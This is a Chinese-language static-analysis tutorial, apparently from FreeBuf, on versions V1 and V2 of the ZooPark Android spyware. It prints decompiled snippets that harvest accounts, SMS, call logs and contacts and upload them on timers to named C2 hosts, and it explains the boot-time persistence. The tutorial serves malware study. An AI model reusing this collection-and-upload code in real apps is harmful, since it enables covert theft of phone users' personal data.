## 背景

**ZooPark是一个针对中东的APT组织，截至2017年，已经发展到了4.0版本，本次分析的主要版本是V1-V3，由于第四版本比较复杂，放在后面单独分析。这次的分析，主要也是一个熟悉静态分析的过程，不涉及脱壳、动态调试、反混淆等，可以是一个入门篇章吧。**

工具：JEB1.5

## V1

分析之前，我们需要理清思路，简单的样本可以直接钻进去，打通它，但是现在的样本都不简单，所以开始之前，需要规划好思路，一步步走，做好记录，V1-V2版本比较简单，做一简单的思路引导：

> 1、 是否加固过，混淆过未加固、未混淆
>
> 2、看安装包目录结构，看是否有特别的文件，记录下来方便后面的分析没有特别的文件
>
> 3、 看清单文件，静态注册了哪些广播接收器没有静态注册广播

### 开始分析代码

[1] 看清单文件AndroidManifest.xml中，入口活动，每个入口活动共有的intent-filter属性

![ZooPark：android逆向之静态分析](https://image.3001.net/images/20180912/1536754621_5b9903bdbb91e.png!small)

[2]
进入入口活动，MainActivity，直接看onCreate方法（活动开启，执行的方法），调用自定义实现的AsyncHttpPostGetURL类（extends
AsyncTask）的execute方法，传入参数this._getbaseurl，即`<http://entekhab10.xp3.biz/ent/index.php>`,根据[2],execute传入的参数，传入doInBackground方法（用于执行较为费时的操作，此方法将接收输入参数和返回计算结果）![ZooPark：android逆向之静态分析](https://image.3001.net/images/20180912/1536756672_5b990bc052e3b.png!small)

[3]
doInBackground中，http请求`<http://entekhab10.xp3.biz/ent/index.php>`，并且因为AsyncHttpPostGetURL传入的参数HashMap为空，空值传入到变量v2，最后被赋值设置成v5的关联实体，也就是url后面带的多余参数，最后如果从这个地址获取到数据，赋给v9并返回，根据2.png中的波斯文，也就是检查网络是否连接的![ZooPark：android逆向之静态分析](https://image.3001.net/images/20180913/1536842808_5b9a5c38edd61.jpg!small)

[4]
延迟1s执行任务，这个任务是，先检查判断网络连接状态，如果网络无连接就返回，这里的有判断_baseUrl长度，但是它构造函数执行是赋值为空。连接正常，然后跟上面一样，后台发起一个访问`<http://entekhab10.xp3.biz/ent/index.php>`的请求，参数继续为空。跟上面不一样的是，这个请求在这个计划任务中，延迟1s执行，随后每3s发起一次请求Timer`*
A facility for threads to schedule tasks for future execution in a background
thread.也就是用来产生后台线程任务的一个工具类`![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-8500fe71a299d0c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)[5]
继续开启计划任务，但是这里使用的是空字符串_baseUrl，来作为C2地址上传设备ID，账户信息，按理说不可能出现这种失误，所以搜索一下这个字符串，看它是不是在前面进行了赋值![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-d03e423d57e8ed04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)找到了赋值的地方，AsyncHttpPostGetURL->onPostExecute()，这个方法是在后台方法doInBackground调用完成后执行，并且将后台方法执行的结果作为参数传入这个方法中，也就是将访问`<http://entekhab10.xp3.biz/ent/index.php>`后的相应数据以#####分开后取后面的字符串值，然后对其进行base64解码，得到真实C2地址，因为`<http://entekhab10.xp3.biz/ent/index.php>`站点已经挂了，根据报告知道C2地址为`[www.rhubarb2.com](http://www.rhubarb2.com)`![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-979ab61c2d09e49c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)[8]
最后，点击两个按钮都会进行上面的行为，上传用户和设备信息![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-2fd855fe13e29633.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## V2

> 1、 是否加固过，混淆过未加固、未混淆
>
> 2、看安装包目录结构，看是否有特别的文件，记录下来方便后面的分析没有特别的文件
>
> 3、看清单文件

### 开始分析代码

[1]
清单文件中可以看到在这里静态注册了开机启动广播接收器BootReceiver，大致过程是：先请求可以接收`android.intent.action.BOOT_COMPLETED`这个action的权限，这样设备完成开机动作时会广播一条`android.intent.action.BOOT_COMPLETED`，广播有权限可以接收到，一旦收到，就执行onReceiver方法![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-f923cb29995d1f0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)[2]
进入广播接收器，这个onReceiver方法只干了一件事每就是打开MainService服务![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-60882d88aa392e93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)[3]
startService方法打开服务的过程：如果不存在该服务，先创建在执行，没有onCreate方法（服务创建时执行），有onStartCommand方法。获取设备ID，设备位置信息，然后根据不同字段构造带有特定数据的信息到C2地址![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-993638535389583e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)`info`：各种设备信息、网络信息、SIM卡信息、位置信息等（详情可以根据里面的API方法在在网上查找）![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-d309870d20a0b2c9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)`cont`：获取联系人信息![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-3fe018b021f9283a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)`acco`：获取账户信息（设置->添加账户，那里添加的账户信息）

    
    
    //获取所有可以访问的账户对象
    v1 = AccountManager.get(((Context)this)).getAccounts();
    //循环账户列表，构造带有字段名（Name$、$Account$）加上账户类型，名称
     while(v4_1 < v5) {
                    v2 = String.valueOf(v2) + "Name$" + v1[v4_1].type.toString() + "$Account$" + v1[v4_1]
                            .name.toString() + "$";
                    ++v4_1;
    

`sms`： 设备中的短信数据![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-e1d3f8aa63ab9e15.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)`cal`：用户电话呼叫数据，号码

    
    
    //查询这个uri
     Cursor v12 = this.getContentResolver().query(Uri.parse("content://call_log/calls"), null, 
                        null, null, "date DESC");
    //构造带有电话呼叫的数据的字符串
    v20.append("Phone Number$" + v19 + "$Call Type$" + v14 + "$Call Date$" + v9 + "$Call duration$"
                             + v10 + "$");
    

`pic`:base64编码zoo.zoo文件![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-a0c13f578ea675f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)根据`12.png`中的指示，将规定字段数据上传到C2![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-e71142a7638af21a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)[4]
延迟5s，上传pic字段的数据，也就是base64编码过的zoo.zoo文件数据

    
    
            new Handler().postDelayed(new Runnable() {
                public void run() {
                    try {
                        String v0 = MainService.this.getUserid();
                        if(!MainService.this.isConnected()) {
                            return;
                        }
                        MainService.this.postUser(v0, "pic");
                    }
                    catch(Exception v1) {
                    }
                }
            }, v8); //v8=5000
    

[5]启动一个计划任务，延迟1s后执行：上传这四个字段的数据，然后每过900s上传一次

    
    
            new Timer().schedule(new TimerTask() {
                static MainService access$0(com.app.postrall.MainService$2 arg1) {
                    return arg1.this$0;
                }
                public void run() {
                    this.val$handler2.post(new Runnable() {
                        public void run() {
                            try {
                                if(!this.this$1.this$0.isConnected()) {
                                    return;
                                }
                                String v0 = this.this$1.this$0.getUserid();
                                //上传这些字段的数据
                                this.this$1.this$0.postUser(v0, "info");
                                this.this$1.this$0.postUser(v0, "cont");
                                this.this$1.this$0.postUser(v0, "acco");
                                this.this$1.this$0.postUser(v0, "sms");
                                this.this$1.this$0.postUser(v0, "cal");
                            }
                            catch(Exception v1) {
                            }
                        }
                    });
                }
            }, v2, 900000); //v2=1000
    

[6]
先构造带有KeyKey为`dafak`，和设备ID数据的C2`<http://www.rhubarb3.com/>`地址，根据返回结果获取一个字段延迟上传特定数据![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-ff4b9546381ca05d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)[7]
清单文件中静态广播执行的一系列行为分析完毕，进入入口类MainActivity的onCreate方法分析，主要就一个行为，就是开启服务MainService

    
    
      protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            this.setContentView(2130903040);
            this.StartMyService();
            if(!this.isConnected()) {
                this.ShowAlert("Please Connect Internet");
            }
            else {
                this.ShowAlert("Please Wait To Update");
            }
        }
    
    
    
     public void StartMyService() {
            try {
                this._checkAllPermision();//检查是否获取了所有请求的权限，如果没有，发起请求
                this.startService(new Intent(((Context)this), MainService.class));
            }
            catch(Exception v1) {
            }
        }
    

可以从证书信息中的起始日期，大致确定样本的流出时间![ZooPark：android逆向之静态分析](https://upload-images.jianshu.io/upload_images/13671484-32956f5cce7802ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

 **小结：V2版本的样本主要就是构造带有设备数据的url，访问C2地址，比第一个版本获取的数据更丰富一些**

## 总结

> 找准关键API，不要过于追求细节，容易钻牛角尖
>
> 分析功能方法时，完整分析他的每个功能，以免漏掉关键点  
>

## 参考来源

> [1] <https://media.kasperskycontenthub.com/wp-> content/uploads/sites/43/2018/05/24122414/ZooPark_for_public_final_edited.pdf>
>
> [2] <https://blog.csdn.net/liuhe688/article/details/6532519>

***本文作者：xiongchaochao，转载请注明来自 FreeBuf.COM**

